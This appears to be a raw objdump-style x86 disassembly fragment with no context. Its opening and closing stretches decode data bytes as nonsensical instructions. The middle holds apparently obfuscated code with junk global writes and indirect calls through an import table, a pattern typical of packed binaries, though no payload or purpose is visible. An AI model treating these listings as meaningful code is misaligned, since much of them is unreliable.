  404c40:	bound  edi,QWORD PTR [edi-0x1b886b6f]
  404c46:	test   eax,0x9e3e30fc
  404c4b:	cdq    
  404c4c:	jmp    edx
  404c4e:	push   cs
  404c4f:	repnz cmp eax,0x9cacabda
  404c55:	enter  0xa53b,0x1
  404c59:	or     DWORD PTR [eax],esp
  404c5b:	pop    ecx
  404c5c:	pop    edx
  404c5d:	xchg   edx,eax
  404c5e:	nop
  404c5f:	adc    ebx,DWORD PTR [esi-0x4be69cdf]
  404c65:	outs   dx,BYTE PTR ds:[esi]
  404c66:	shr    DWORD PTR [eax-0x44d0a56d],0x92
  404c6d:	mov    edx,0x425285c3
  404c72:	dec    esp
  404c73:	adc    BYTE PTR [eax+0x58],cl
  404c76:	ret    
  404c77:	scas   al,BYTE PTR es:[edi]
  404c78:	cwde   
  404c79:	xchg   edx,eax
  404c7a:	sbb    DWORD PTR [ecx],esi
  404c7c:	lock xor BYTE PTR ds:0x476f4dca,0x4a
  404c84:	mov    eax,fs
  404c86:	nop
  404c87:	fst    QWORD PTR [ecx+ebx*8-0x376729e9]
  404c8e:	adc    ebp,DWORD PTR [eax]
  404c90:	adc    DWORD PTR [ecx-0xc0abf34],esi
  404c96:	test   BYTE PTR [esp+edi*8+0x3ad34cd2],bh
  404c9d:	out    dx,al
  404c9e:	sbb    DWORD PTR [edi+0x66d8e4bc],edi
  404ca4:	inc    ebp
  404ca5:	dec    eax
  404ca6:	out    dx,eax
  404ca7:	fcmovne st,st(3)
  404ca9:	(bad)  
  404cab:	aad    0x78
  404cad:	clc    
  404cae:	shl    eax,1
  404cb0:	jae    0x404c56
  404cb2:	loope  0x404cdc
  404cb4:	imul   esi,DWORD PTR [ebx-0x129a9616],0x1a
  404cbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404cbc:	mov    ebx,0xd0eb2ed2
  404cc1:	add    DWORD PTR [edi+0x60866d7],edi
  404cc7:	movq   mm6,mm7
  404cca:	push   esi
  404ccb:	fild   DWORD PTR [ebx]
  404ccd:	clc    
  404cce:	cmp    ecx,esp
  404cd0:	fstp   st(1)
  404cd2:	retf   
  404cd3:	or     DWORD PTR [esi],esi
  404cd5:	jmp    0x404c76
  404cd7:	mov    cl,0x51
  404cd9:	int    0x3
  404cdb:	scas   eax,DWORD PTR es:[edi]
  404cdc:	ss push ecx
  404cde:	std    
  404cdf:	mov    ah,0x57
  404ce1:	adc    ch,BYTE PTR [edi+esi*4-0x49393862]
  404ce8:	ins    DWORD PTR es:[edi],dx
  404ce9:	(bad)  
  404cea:	mov    BYTE PTR [edi],dh
  404cec:	leave  
  404ced:	xchg   esp,eax
  404cee:	mov    esi,0x402f0140
  404cf3:	rcl    edx,1
  404cf5:	out    dx,al
  404cf6:	xor    eax,0xb1422c79
  404cfb:	sub    al,0x8
  404cfd:	ja     0x404d2b
  404cff:	fcom   QWORD PTR [edx-0x3718401e]
  404d05:	shl    BYTE PTR ss:[esi+0x1c6b694c],cl
  404d0c:	scas   al,BYTE PTR es:[edi]
  404d0d:	pop    ebp
  404d0e:	mov    al,ds:0xe5617cd
  404d13:	sbb    DWORD PTR [eax+eax*8],edx
  404d16:	je     0x404ce5
  404d18:	les    ebx,FWORD PTR [esp+eax*4]
  404d1b:	lods   eax,DWORD PTR ds:[esi]
  404d1c:	icebp  
  404d1d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d1e:	leave  
  404d1f:	out    0x5a,eax
  404d21:	mov    esp,0xc6ed33c6
  404d26:	in     al,0x29
  404d28:	shl    BYTE PTR [eax-0xd],0x35
  404d2c:	pop    esp
  404d2d:	xchg   BYTE PTR [ebp+0x62],bl
  404d30:	jl     0x404ce4
  404d32:	imul   ebx,ebp,0xffffffc3
  404d35:	add    eax,0x8b41109f
  404d3a:	dec    esi
  404d3b:	mov    eax,0x715a2be7
  404d40:	add    al,0x96
  404d42:	ss push esi
  404d44:	cmp    dl,dh
  404d46:	cmp    esi,esi
  404d48:	(bad)  
  404d49:	stc    
  404d4a:	lods   al,BYTE PTR ds:[esi]
  404d4b:	or     bh,al
  404d4d:	(bad)  
  404d4e:	push   ebx
  404d4f:	je     0x404cfe
  404d51:	jbe    0x404db4
  404d53:	test   al,0x87
  404d55:	or     eax,0xd67b37f1
  404d5a:	adc    al,BYTE PTR [ecx]
  404d5c:	scas   eax,DWORD PTR es:[edi]
  404d5d:	inc    edi
  404d5e:	(bad)  
  404d5f:	cld    
  404d60:	jle    0x404dd2
  404d62:	jg     0x404d19
  404d64:	fistp  WORD PTR [esi-0x39]
  404d67:	cld    
  404d68:	aam    0x40
  404d6a:	rcl    DWORD PTR [edx+edi*1+0x3628d63e],1
  404d71:	sbb    bl,BYTE PTR [ecx+0x45]
  404d74:	cli    
  404d75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d76:	mov    esp,0xd05b8702
  404d7b:	xor    al,0x4d
  404d7d:	pop    ebp
  404d7e:	mov    ds:0xc5cd9df3,al
  404d83:	dec    eax
  404d84:	and    al,0xe8
  404d86:	or     BYTE PTR [edi-0x64059a32],dh
  404d8c:	test   al,0xf4
  404d8e:	dec    esi
  404d8f:	cdq    
  404d90:	pop    edx
  404d91:	fdivr  QWORD PTR [esi]
  404d93:	xchg   esp,eax
  404d94:	mov    ds:0x1caa8de6,al
  404d99:	je     0x404d81
  404d9b:	stos   DWORD PTR es:[edi],eax
  404d9c:	rcl    DWORD PTR [edx],1
  404d9e:	mov    DWORD PTR [ecx-0x11],esp
  404da1:	inc    edx
  404da2:	cs loop 0x404d94
  404da5:	(bad)  
  404da6:	pop    esp
  404da7:	mov    eax,0x6f684396
  404dac:	jmp    0xfcf2f457
  404db1:	test   eax,0x37dfe787
  404db6:	loopne 0x404d8c
  404db8:	or     eax,0xa609ff87
  404dbd:	add    BYTE PTR [ebx+0x33db6626],ch
  404dc3:	push   0xbba65006
  404dc8:	rcl    DWORD PTR [ebp-0x54357f52],cl
  404dce:	sub    eax,0x710c9291
  404dd3:	fisttp QWORD PTR [edx+0x52fb5ed6]
  404dd9:	jl     0x404db3
  404ddb:	sbb    BYTE PTR [esi],dh
  404ddd:	xchg   ebx,eax
  404dde:	stos   DWORD PTR es:[edi],eax
  404ddf:	adc    ecx,esp
  404de1:	clc    
  404de2:	jae    0x404e45
  404de4:	pop    ds
  404de5:	outs   dx,DWORD PTR cs:[esi]
  404de7:	inc    edi
  404de8:	leave  
  404de9:	popf   
  404dea:	lock adc DWORD PTR [edi],0x4179cbd7
  404df1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404df2:	shl    BYTE PTR [ecx*8+0x7ec46ec5],0xf9
  404dfa:	push   eax
  404dfb:	mov    ch,BYTE PTR [ecx+0x37]
  404dfe:	ja     0x404d85
  404e00:	jmp    0x404da7
  404e02:	add    BYTE PTR [ebx-0x648ae0cf],0x51
  404e09:	loope  0x404e0d
  404e0b:	scas   al,BYTE PTR es:[edi]
  404e0c:	bound  esp,QWORD PTR [ebp+0x3a]
  404e0f:	jg     0x404dba
  404e11:	pop    esp
  404e12:	mov    ds:0x79beeb97,eax
  404e17:	cld    
  404e18:	push   edi
  404e19:	mov    al,ds:0xbc3ccd5f
  404e1e:	add    bl,BYTE PTR [eax+edx*8-0x43361106]
  404e25:	cwde   
  404e26:	jbe    0x404e63
  404e28:	test   BYTE PTR [esp+ebp*4-0x57],0x88
  404e2d:	enter  0xa9ad,0x6f
  404e31:	dec    edx
  404e32:	icebp  
  404e33:	sub    eax,0xedfa4e4e
  404e38:	xchg   ecx,eax
  404e39:	jo     0x404dbe
  404e3b:	sub    BYTE PTR [edi],ah
  404e3d:	inc    esp
  404e3e:	fstp   TBYTE PTR [ebx+ebx*8-0x3587b692]
  404e45:	jae    0x404eae
  404e47:	sti    
  404e48:	(bad)  
  404e4a:	icebp  
  404e4b:	test   al,0x79
  404e4d:	mov    ds:0xa5735287,eax
  404e52:	add    al,0x15
  404e54:	int3   
  404e55:	jl     0x404e92
  404e57:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404e58:	stos   DWORD PTR es:[edi],eax
  404e59:	repz gs mov ah,0x52
  404e5d:	push   esi
  404e5e:	add    al,0x34
  404e60:	jmp    0xc76f3ad7
  404e65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404e66:	loop   0x404ea8
  404e68:	nop
  404e69:	or     BYTE PTR [esi],ah
  404e6b:	sub    al,0xe1
  404e6e:	dec    ebp
  404e6f:	fs xor cl,dl
  404e72:	mov    ch,0xcf
  404e74:	rcl    BYTE PTR [ebx],0x8e
  404e77:	pusha  
  404e78:	out    dx,al
  404e79:	lds    esi,FWORD PTR [ecx-0x6a]
  404e7c:	jge    0x404e49
  404e7e:	iret   
  404e7f:	daa    
  404e80:	mov    ah,0xff
  404e82:	cmp    eax,0xa795a949
  404e87:	mov    dh,0x63
  404e89:	pop    edx
  404e8a:	xchg   esp,eax
  404e8b:	aad    0xa5
  404e8d:	mov    DWORD PTR fs:[ecx+edx*4-0x5d],edi
  404e92:	test   eax,0x26423542
  404e97:	mov    al,cs:0x8f03488c
  404e9d:	inc    ebp
  404e9e:	xlat   BYTE PTR ds:[ebx]
  404e9f:	push   eax
  404ea0:	gs dec ecx
  404ea2:	cmp    al,0x18
  404ea4:	mov    bh,0x88
  404ea6:	mov    bl,0x7e
  404ea8:	aad    0xaf
  404eaa:	addr16 jae 0x404ebf
  404ead:	xor    al,0x8b
  404eaf:	or     DWORD PTR [ebx],ebp
  404eb1:	dec    ebp
  404eb2:	ins    BYTE PTR es:[edi],dx
  404eb3:	or     bl,dh
  404eb5:	or     DWORD PTR [eax+0xa],eax
  404eb8:	sbb    bh,BYTE PTR [edi-0x69789b52]
  404ebe:	mov    DWORD PTR [ecx+0x65],edx
  404ec1:	sbb    ebp,DWORD PTR [edi+0x77e45b5b]
  404ec7:	aad    0xff
  404ec9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404eca:	sub    BYTE PTR [esi-0x40],0xae
  404ece:	vcvtss2sd xmm6,xmm1,DWORD PTR [ecx+esi*4+0x1f69a67a]
  404ed7:	test   eax,0xff1e65ab
  404edc:	aad    0x87
  404ede:	ja     0x404f40
  404ee0:	cmp    esi,DWORD PTR [ecx]
  404ee2:	push   0x669128f0
  404ee7:	cld    
  404ee8:	idiv   DWORD PTR [ebx-0x37]
  404eeb:	daa    
  404eec:	sub    edx,DWORD PTR [edi+0x0]
  404eef:	popa   
  404ef0:	push   ds
  404ef1:	adc    BYTE PTR [edi],0x19
  404ef4:	xor    al,0xc7
  404ef6:	sbb    esp,DWORD PTR [eax]
  404ef8:	jmp    0x404ec8
  404efa:	or     al,0xa2
  404efc:	sti    
  404efd:	pop    ecx
  404efe:	ins    DWORD PTR es:[edi],dx
  404eff:	clc    
  404f00:	and    esp,ecx
  404f02:	inc    esi
  404f03:	(bad)  
  404f04:	fs jne 0x404f13
  404f07:	(bad)  
  404f08:	lods   al,BYTE PTR ds:[esi]
  404f09:	mov    dl,0x6d
  404f0b:	scas   eax,DWORD PTR es:[edi]
  404f0c:	push   0x6f
  404f0e:	in     al,dx
  404f0f:	dec    esp
  404f10:	das    
  404f11:	repz ror DWORD PTR ds:0x5dc2a239,cl
  404f18:	xor    BYTE PTR [esi-0x4c3d6515],ah
  404f1e:	inc    edi
  404f1f:	pop    esp
  404f20:	jg     0x404ea8
  404f22:	mov    ebp,DWORD PTR [eax+0x45]
  404f25:	dec    ebp
  404f26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404f27:	popf   
  404f28:	xchg   ebx,eax
  404f29:	fcomp  QWORD PTR [ecx]
  404f2b:	jb     0x404f38
  404f2d:	push   ebp
  404f2e:	in     al,0x81
  404f30:	sbb    eax,0x42827b
  404f35:	push   esi
  404f36:	je     0x404f38
  404f38:	add    cl,al
  404f3a:	loope  0x404f5a
  404f3c:	lea    ecx,[edx+eax*1]
  404f3f:	adc    edx,DWORD PTR ds:0x428287
  404f45:	mov    eax,DWORD PTR [ebx]
  404f47:	or     DWORD PTR ds:0x42839b,edi
  404f4d:	mov    edx,DWORD PTR [ebx+0x4]
  404f50:	mov    DWORD PTR ds:0x428377,0x1480
  404f5a:	shrd   eax,edx,0x2
  404f5e:	adc    DWORD PTR ds:0x428383,0x1a3a
  404f68:	shr    edx,0x2
  404f6b:	cmp    DWORD PTR ds:0x428383,0x0
  404f72:	mov    DWORD PTR ds:0x428313,ebx
  404f78:	mov    DWORD PTR ds:0x42838b,0x56b3
  404f82:	mov    DWORD PTR ds:0x42826b,0x1c7d
  404f8c:	jmp    0x405004
  404f91:	mov    DWORD PTR ds:0x42823f,ebx
  404f97:	mov    DWORD PTR ds:0x428277,0x5683
  404fa1:	cmp    DWORD PTR ds:0x428383,0x0
  404fa8:	jg     0x404fd2
  404fae:	push   0x428f
  404fb3:	push   DWORD PTR [ebp-0x14]
  404fb6:	call   DWORD PTR ds:0x428d8c
  404fbc:	and    edx,DWORD PTR ds:0x428323
  404fc2:	sub    DWORD PTR ds:0x42824f,ecx
  404fc8:	or     DWORD PTR ds:0x428243,0xf0b
  404fd2:	adc    DWORD PTR ds:0x42817f,0x4903
  404fdc:	mov    edx,DWORD PTR ds:0x428363
  404fe2:	mov    edx,DWORD PTR [edx]
  404fe4:	add    DWORD PTR ds:0x42816b,edx
  404fea:	xor    edx,edx
  404fec:	xor    edx,DWORD PTR ds:0x428163
  404ff2:	xor    DWORD PTR ds:0x4282a3,edx
  404ff8:	mov    edx,DWORD PTR ds:0x428277
  404ffe:	add    DWORD PTR ds:0x42839b,edx
  405004:	mov    DWORD PTR [ebp-0x1c],eax
  405007:	mov    eax,ds:0x4282a3
  40500c:	add    DWORD PTR ds:0x42827b,eax
  405012:	mov    eax,DWORD PTR [ebx]
  405014:	sub    edx,0x532
  40501a:	mov    edx,DWORD PTR [ebx+0x4]
  40501d:	xor    DWORD PTR [ebp-0x1c],edi
  405020:	mov    edx,eax
  405022:	xor    eax,eax
  405024:	add    DWORD PTR ds:0x428383,0x32cc
  40502e:	or     eax,DWORD PTR [ebp-0x1c]
  405031:	sub    DWORD PTR ds:0x42838f,0x1679
  40503b:	shl    edx,0x1e
  40503e:	and    DWORD PTR ds:0x428177,edi
  405044:	imul   eax,ecx
  405047:	mov    ecx,DWORD PTR [ebx]
  405049:	mov    edx,DWORD PTR [ebx+0x4]
  40504c:	shrd   ecx,edx,0x2
  405050:	sbb    DWORD PTR ds:0x42839f,0x5de1
  40505a:	mov    DWORD PTR [ebp-0x1c],ecx
  40505d:	sbb    DWORD PTR ds:0x42828f,0x3a7c
  405067:	mov    ecx,DWORD PTR [ebx]
  405069:	adc    DWORD PTR ds:0x428183,0x428267
  405073:	xor    DWORD PTR [ebp-0x1c],edi
  405076:	shr    edx,0x2
  405079:	adc    DWORD PTR ds:0x42837b,ecx
  40507f:	mov    edx,DWORD PTR [ebx+0x4]
  405082:	mov    edx,ecx
  405084:	xor    ecx,ecx
  405086:	mov    DWORD PTR ds:0x42838b,0x321a
  405090:	or     ecx,DWORD PTR [ebp-0x1c]
  405093:	adc    DWORD PTR ds:0x42827b,0x428387
  40509d:	shl    edx,0x1e
  4050a0:	or     DWORD PTR ds:0x428273,0x428293
  4050aa:	sub    ecx,eax
  4050ac:	mov    eax,DWORD PTR [ebp-0xc]
  4050af:	mov    DWORD PTR ds:0x428247,0x7aa6
  4050b9:	cmp    DWORD PTR [eax],ecx
  4050bb:	not    eax
  4050bd:	mov    eax,DWORD PTR [ebp-0xc]
  4050c0:	mov    DWORD PTR ds:0x42837b,0x460d
  4050ca:	jg     0x405287
  4050d0:	mov    ecx,DWORD PTR [ebp+0x18]
  4050d3:	xor    DWORD PTR ds:0x42838b,edx
  4050d9:	mov    edx,DWORD PTR [ebp+0x1c]
  4050dc:	sbb    DWORD PTR ds:0x428397,0x42823b
  4050e6:	shrd   ecx,edx,0x2
  4050ea:	sbb    DWORD PTR ds:0x428263,0x42824f
  4050f4:	mov    DWORD PTR [ebp-0x1c],ecx
  4050f7:	mov    ecx,DWORD PTR [ebp+0x18]
  4050fa:	xor    DWORD PTR [ebp-0x1c],edi
  4050fd:	or     DWORD PTR ds:0x42829f,0x2ce0
  405107:	shl    ecx,0x1e
  40510a:	xor    ecx,ecx
  40510c:	and    DWORD PTR ds:0x42827f,0x42825b
  405116:	or     ecx,DWORD PTR [ebp-0x1c]
  405119:	shr    edx,0x2
  40511c:	or     DWORD PTR ds:0x428167,ebx
  405122:	mov    edx,DWORD PTR [ebp+0x1c]
  405125:	mov    DWORD PTR [ebp-0x2c],ecx
  405128:	cmp    DWORD PTR ds:0x42838b,0x0
  40512f:	mov    DWORD PTR ds:0x42819b,edx
  405135:	mov    DWORD PTR ds:0x42836b,ecx
  40513b:	not    edx
  40513d:	jmp    0x405212
  405142:	mov    DWORD PTR ds:0x42817b,0x795c
  40514c:	cmp    DWORD PTR ds:0x42838b,0x0
  405153:	ja     0x40517c
  405159:	push   0x427fac
  40515e:	push   DWORD PTR [ebp-0x24]
  405161:	push   0x6923
  405166:	call   DWORD PTR ds:0x428db4
  40516c:	or     DWORD PTR ds:0x428273,0xa87
  405176:	add    ecx,DWORD PTR ds:0x4283a7
  40517c:	adc    ecx,DWORD PTR ds:0x42818b
  405182:	xor    DWORD PTR ds:0x42817b,0x1a4f
  40518c:	sbb    DWORD PTR ds:0x42828f,edx
  405192:	cmp    DWORD PTR ds:0x4282eb,0x0
  405199:	mov    DWORD PTR ds:0x428317,0x66a6
  4051a3:	mov    DWORD PTR ds:0x4282f7,ecx
  4051a9:	mov    ecx,0x67a4
  4051ae:	jmp    0x405212
  4051b3:	mov    edx,0x2152
  4051b8:	cmp    DWORD PTR ds:0x4282eb,0x0
  4051bf:	jge    0x4051e9
  4051c5:	push   DWORD PTR [ebp-0x28]
  4051c8:	push   DWORD PTR [ebp-0x28]
  4051cb:	call   DWORD PTR ds:0x428db8
  4051d1:	inc    DWORD PTR ds:0x428287
  4051d7:	mov    ecx,DWORD PTR ds:0x4281c7
  4051dd:	mov    edx,DWORD PTR ds:0x4283c7
  4051e3:	sub    ecx,edx
  4051e5:	imul   ecx,DWORD PTR [ecx+edx*1]
  4051e9:	xor    DWORD PTR ds:0x4282eb,0x4a74
  4051f3:	mov    edx,DWORD PTR ds:0x4281bf
  4051f9:	mov    edx,DWORD PTR [edx]
  4051fb:	sub    DWORD PTR ds:0x428273,edx
  405201:	mov    edx,DWORD PTR ds:0x4281d7
  405207:	mov    ecx,DWORD PTR ds:0x4283c7
  40520d:	sub    ecx,edx
  40520f:	and    edx,DWORD PTR [edx+ecx*1]
  405212:	mov    ecx,DWORD PTR [ebx]
  405214:	sub    DWORD PTR ds:0x42837f,0x2089
  40521e:	mov    edx,DWORD PTR [ebx+0x4]
  405221:	shrd   ecx,edx,0x2
  405225:	shr    edx,0x2
  405228:	mov    DWORD PTR [ebp-0x1c],ecx
  40522b:	xor    edx,edx
  40522d:	xor    edx,DWORD PTR ds:0x42828f
  405233:	sub    DWORD PTR ds:0x428193,edx
  405239:	mov    ecx,DWORD PTR [ebx]
  40523b:	inc    edx
  40523c:	mov    edx,DWORD PTR [ebx+0x4]
  40523f:	add    DWORD PTR ds:0x42836b,0x35fe
  405249:	xor    DWORD PTR [ebp-0x1c],edi
  40524c:	xor    edx,edx
  40524e:	xor    DWORD PTR ds:0x428177,0x631d
  405258:	or     edx,DWORD PTR [ebp-0x1c]
  40525b:	xor    DWORD PTR ds:0x42827f,0x428183
  405265:	shl    ecx,0x1e
  405268:	and    DWORD PTR ds:0x42839b,0x428267
  405272:	imul   edx,DWORD PTR [ebp-0x2c]
  405276:	add    DWORD PTR ds:0x428393,0x4996
  405280:	sub    DWORD PTR [eax],edx
  405282:	jmp    0x4058d5
  405287:	add    DWORD PTR ds:0x42816b,0x42f2
  405291:	mov    ecx,DWORD PTR [esi]
  405293:	cmp    DWORD PTR ds:0x4282a3,0x0
  40529a:	mov    DWORD PTR ds:0x428233,0x7c0
  4052a4:	mov    edx,DWORD PTR ds:0x428273
  4052aa:	mov    DWORD PTR ds:0x4282fb,0x4c43
  4052b4:	jmp    0x405321
  4052b9:	mov    DWORD PTR ds:0x4283a3,0x6b40
  4052c3:	mov    DWORD PTR ds:0x42828b,0x2bfd
  4052cd:	cmp    DWORD PTR ds:0x4282a3,0x0
  4052d4:	jae    0x4052fc
  4052da:	push   0x428069
  4052df:	push   0x1ca9
  4052e4:	call   DWORD PTR ds:0x428dbc
  4052ea:	add    edx,DWORD PTR ds:0x42825b
  4052f0:	adc    edx,0x1702
  4052f6:	add    edx,DWORD PTR ds:0x428183
  4052fc:	and    DWORD PTR ds:0x42818f,0x3bee
  405306:	dec    edx
  405307:	xor    edx,edx
  405309:	or     edx,DWORD PTR ds:0x428267
  40530f:	add    DWORD PTR ds:0x4282a3,edx
  405315:	mov    edx,DWORD PTR ds:0x42828b
  40531b:	add    DWORD PTR ds:0x428173,edx
  405321:	mov    edx,DWORD PTR [esi+0x4]
  405324:	xor    DWORD PTR ds:0x4282f7,0x42822f
  40532e:	shrd   ecx,edx,0x2
  405332:	mov    DWORD PTR [ebp-0x1c],ecx
  405335:	cmp    DWORD PTR ds:0x428313,0x0
  40533c:	mov    DWORD PTR ds:0x42830f,edi
  405342:	mov    DWORD PTR ds:0x428277,ebx
  405348:	jmp    0x405426
  40534d:	mov    DWORD PTR ds:0x42831b,0x4d36
  405357:	mov    DWORD PTR ds:0x428397,0x1e95
  405361:	cmp    DWORD PTR ds:0x428313,0x0
  405368:	jb     0x405396
  40536e:	push   0x848f
  405373:	push   0x5d21
  405378:	call   DWORD PTR ds:0x428dc0
  40537e:	not    ecx
  405380:	adc    DWORD PTR ds:0x42839f,ecx
  405386:	neg    ecx
  405388:	mov    ecx,DWORD PTR ds:0x4283df
  40538e:	mov    ecx,DWORD PTR [ecx]
  405390:	sub    DWORD PTR ds:0x42837f,ecx
  405396:	mov    ecx,DWORD PTR ds:0x42824f
  40539c:	xor    DWORD PTR ds:0x42815b,ecx
  4053a2:	or     ecx,0x48b0
  4053a8:	sbb    DWORD PTR ds:0x42827b,edx
  4053ae:	cmp    DWORD PTR ds:0x4282fb,0x0
  4053b5:	mov    DWORD PTR ds:0x428167,edi
  4053bb:	not    DWORD PTR ds:0x42823b
  4053c1:	jmp    0x405426
  4053c6:	mov    DWORD PTR ds:0x428197,0xab0
  4053d0:	cmp    DWORD PTR ds:0x4282fb,0x0
  4053d7:	jb     0x405406
  4053dd:	push   0x56df
  4053e2:	push   DWORD PTR [ebp-0x20]
  4053e5:	push   DWORD PTR [ebp-0x20]
  4053e8:	push   0x14ed
  4053ed:	push   DWORD PTR [ebp-0x24]
  4053f0:	call   DWORD PTR ds:0x428dc4
  4053f6:	sub    ecx,DWORD PTR ds:0x42819b
  4053fc:	sub    DWORD PTR ds:0x42823b,0x6432
  405406:	or     DWORD PTR ds:0x42825f,0x3285
  405410:	adc    ecx,DWORD PTR ds:0x42818f
  405416:	sub    DWORD PTR ds:0x428393,edi
  40541c:	mov    DWORD PTR ds:0x42823b,0x48f2
  405426:	mov    ecx,DWORD PTR [esi]
  405428:	xor    DWORD PTR [ebp-0x1c],edi
  40542b:	shl    ecx,0x1e
  40542e:	adc    DWORD PTR ds:0x428277,0xf0c
  405438:	xor    ecx,ecx
  40543a:	xor    DWORD PTR ds:0x4282ef,0x1337
  405444:	or     ecx,DWORD PTR [ebp-0x1c]
  405447:	shr    edx,0x2
  40544a:	mov    edx,DWORD PTR ds:0x42839f
  405450:	sub    edx,DWORD PTR ds:0x428153
  405456:	mov    DWORD PTR ds:0x42839f,edx
  40545c:	jmp    0x40583a
  405461:	xchg   ecx,eax
  405462:	stc    
  405463:	xchg   ebp,eax
  405464:	out    dx,al
  405465:	ins    BYTE PTR es:[edi],dx
  405466:	push   0x6b
  405468:	jbe    0x405493
  40546a:	push   0x25
  40546c:	stos   BYTE PTR es:[edi],al
  40546d:	and    al,0xfe
  40546f:	adc    BYTE PTR [esi-0x1a],bh
  405472:	mov    ecx,0x129e1818
  405477:	sbb    BYTE PTR [eax],bl
  405479:	pop    esi
  40547b:	in     al,dx
  40547c:	stc    
  40547d:	mov    dh,0x9f
  40547f:	mov    ch,0xa3
  405481:	xchg   edx,eax
  405482:	add    BYTE PTR [esi+0x7ead80c2],bh
  405488:	jle    0x40544c
  40548a:	push   edi
  40548b:	lahf   
  40548c:	into   
  40548d:	and    eax,DWORD PTR [ebx]
  40548f:	sub    al,0x16
  405491:	cli    
  405492:	add    DWORD PTR [eax+ecx*1+0x35683ea4],edi
  405499:	rcr    DWORD PTR [edx+0x7b8d95ae],cl
  40549f:	or     DWORD PTR [ecx+0xe],esi
  4054a2:	sbb    BYTE PTR [eax],bl
  4054a4:	sbb    esp,ecx
  4054a6:	sub    dl,BYTE PTR [ebp-0x53a7b428]
  4054ac:	nop
  4054ad:	leave  
  4054ae:	jno    0x40549d
  4054b0:	test   BYTE PTR [edi+0x36],ah
  4054b3:	jb     0x4054a3
  4054b5:	dec    esp
  4054b6:	xchg   BYTE PTR [edx-0x6ee4c291],bl
  4054bc:	sbb    DWORD PTR [ebp+0x3d3d1a77],0x40dfdf51
  4054c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4054c7:	cwde   
  4054c8:	sbb    BYTE PTR [ebp-0xf56df9a],bh
  4054ce:	jbe    0x405499
  4054d0:	pusha  
  4054d1:	sbb    eax,0x147bdfe3
  4054d6:	ret    0x3672
  4054d9:	xor    BYTE PTR [ebx-0x3f487ffe],cl
  4054df:	inc    ebx
  4054e0:	ret    0x73b1
  4054e3:	mov    DWORD PTR [ebp+0x69d98df4],esp
  4054e9:	(bad)  
  4054ea:	mov    edx,0xfc7d9d83
  4054ef:	xchg   BYTE PTR [ebx],bl
  4054f1:	cmp    al,0x3f
  4054f3:	sbb    DWORD PTR ds:0x758e3b22,eax
  4054f9:	mov    edx,0x9046793d
  4054fe:	add    esp,DWORD PTR [ecx-0x488919a7]
  405504:	sub    al,0x11
  405506:	adc    eax,eax
  405508:	xchg   DWORD PTR [edi],ecx
  40550a:	adc    DWORD PTR ds:0x22cee83a,edx
  405510:	jp     0x405542
  405512:	(bad)  es:[edi+0xf9a6cb0]
  405519:	bound  edx,QWORD PTR [edi]
  40551b:	popa   
  40551c:	add    eax,0xe62a9a34
  405521:	xchg   esi,eax
  405522:	xchg   edi,eax
  405523:	sbb    BYTE PTR [ebp+0x3fdb2ead],ch
  405529:	mov    esp,0x3d69360c
  40552e:	jge    0x40556a
  405530:	cdq    
  405531:	jmp    0x880:0xbae8509f
  405538:	stos   DWORD PTR es:[edi],eax
  405539:	cmp    DWORD PTR [edx],esp
  40553b:	dec    edx
  40553c:	or     al,0x54
  40553e:	sbb    eax,0x8a6b84ac
  405543:	cmp    al,0x6b
  405545:	mov    al,0xdf
  405547:	fnstsw WORD PTR [ebx]
  405549:	call   0x88db:0x7e044c6a
  405550:	cli    
  405551:	shr    BYTE PTR [edx+eax*2-0x3237f3e],1
  405558:	clc    
  405559:	cmp    dh,BYTE PTR [edi]
  40555b:	inc    edi
  40555c:	(bad)  
  40555d:	ja     0x405528
  40555f:	ja     0x405504
  405561:	mov    ah,0xdf
  405563:	add    DWORD PTR [ecx],0x4b
  405566:	fsubr  QWORD PTR [edx+0x21]
  405569:	mov    ebx,DWORD PTR [ebx+0x344b3428]
  40556f:	cmp    al,0x3
  405571:	lock mov dl,0xb6
  405574:	cdq    
  405575:	std    
  405576:	push   eax
  405577:	rol    BYTE PTR [esi-0x4],0xa8
  40557b:	jmp    0x3ce9:0x28e41748
  405582:	jb     0x405538
  405584:	stos   DWORD PTR es:[edi],eax
  405585:	sbb    BYTE PTR [esp+eiz*2+0x37],ah
  405589:	jb     0x405552
  40558b:	xor    ecx,DWORD PTR [edi]
  40558d:	loope  0x405528
  40558f:	adc    ebp,0x21
  405592:	push   0x78796bc0
  405597:	add    eax,0x5a32623b
  40559c:	mov    ds:0x1584f6e3,al
  4055a1:	pop    ebp
  4055a2:	sbb    BYTE PTR [esi+0x56e61adb],bl
  4055a8:	scas   al,BYTE PTR es:[edi]
  4055a9:	rcr    DWORD PTR [ebp-0x6cc64cb],1
  4055af:	lds    ebx,FWORD PTR [edi]
  4055b1:	add    dl,BYTE PTR [ebx]
  4055b3:	jl     0x405556
  4055b5:	pop    edi
  4055b6:	cmp    esp,DWORD PTR [esi+0x35f72a21]
  4055bc:	sbb    eax,0x310e90fe
  4055c1:	pop    es
  4055c2:	or     bh,BYTE PTR ds:0xc35f360b
  4055c8:	(bad)  
  4055c9:	pop    edx
  4055ca:	jae    0x405572
  4055cc:	mov    esi,0x8d8ad517
  4055d1:	push   eax
  4055d2:	mov    bh,0xb6
  4055d4:	pop    ecx
  4055d5:	sub    ah,BYTE PTR [ebx-0x77d60c70]
  4055db:	in     eax,dx
  4055dc:	sub    ch,ch
  4055de:	cs cmc 
  4055e0:	push   esp
  4055e1:	xor    bl,BYTE PTR [ecx-0x641c8d0f]
  4055e7:	nop
  4055e8:	dec    edi
  4055e9:	imul   edi,DWORD PTR [esi+0x53],0x442ddf96
  4055f0:	pop    ebx
  4055f1:	inc    ecx
  4055f2:	sub    esi,DWORD PTR [ecx-0x835e918]
  4055f8:	mov    al,0xdd
  4055fa:	mov    ch,0x94
  4055fc:	pop    edx
  4055fd:	dec    ecx
  4055fe:	scas   al,BYTE PTR es:[edi]
  4055ff:	add    eax,0xcdc00bed
  405604:	xchg   DWORD PTR [ebp+0x1c],ebp
  405607:	cld    
  405608:	dec    eax
  405609:	inc    eax
  40560a:	cmp    DWORD PTR [ebp+edi*8-0x3],esp
